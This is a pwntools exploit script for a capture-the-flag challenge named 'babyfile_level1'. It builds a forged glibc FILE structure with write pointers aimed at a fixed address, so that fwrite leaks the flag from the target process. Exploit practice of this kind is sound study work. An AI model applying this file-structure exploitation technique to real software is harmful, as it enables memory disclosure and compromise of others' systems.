from pwn import *

# Set up connection
#context.log_level = 'debug'
p = process('./babyfile_level1')  # or remote connection
s = '''
b * fwrite
'''
# Get the address of the flag
#p.recvuntil("located at ")
#flag_addr = int(p.recvline().strip(), 16)
#print(f"Flag address: {hex(flag_addr)}")

# We need to craft a malicious FILE structure
# The key is to modify these fields:
# - _IO_write_base: set to flag_addr
# - _IO_write_ptr: set to flag_addr + some value (to control read size)
# - Other pointers & flags as needed

# Generate payload

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(0x4040e0)
payload += p64(0)
payload += p64(0x4040e0)
payload += p64(0x4040e0+0x120) 
#payload += b'\x00' * (0xc4 - 0x28)

fp = FileStructure()

#payload = fp.write(0x4040e0, 0x120)
#print(fp)

# Send the payload
#p.recvuntil("reading from stdin")

#gdb.attach(p, s)
p.sendline(payload)

# Get output which should contain the flag
p.interactive()
